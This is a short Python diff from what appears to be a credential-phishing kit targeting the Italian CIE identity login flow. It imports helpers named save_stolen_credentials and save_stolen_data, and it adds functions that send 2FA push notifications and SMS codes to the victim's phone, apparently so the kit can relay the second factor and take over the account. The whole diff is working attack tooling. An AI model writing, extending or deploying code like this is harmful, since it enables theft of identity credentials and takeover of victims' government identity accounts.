@@ -1,4 +1,4 @@
-from .client import execute_access_flow, access_again_login_page, post_credentials, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access
+from .client import execute_access_flow, access_again_login_page, post_credentials, contact_user_phone, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access
 from .parser import extract_qr_code, extract_login_errors
 from ..flow import LoginFlow
 from ..utils.writer import save_stolen_credentials, save_stolen_data
@@ -36,6 +36,14 @@ def submit_credentials(login_flow: LoginFlow, credentials: dict) -> dict | None:
     error = extract_login_errors(login_flow.response.text)
 
     return error
+
+def send_2fa_notification(login_flow: LoginFlow) -> None:
+    """Sends the 2FA notification to the CIE login page"""
+    contact_user_phone(login_flow, "push")
+
+def send_2fa_sms(login_flow: LoginFlow) -> None:
+    """Sends the 2FA SMS to the CIE login page"""
+    contact_user_phone(login_flow, "sms")
 
 def check_2fa(login_flow: LoginFlow) -> dict:
     """Checks if the 2FA has been confirmed and returns the result"""
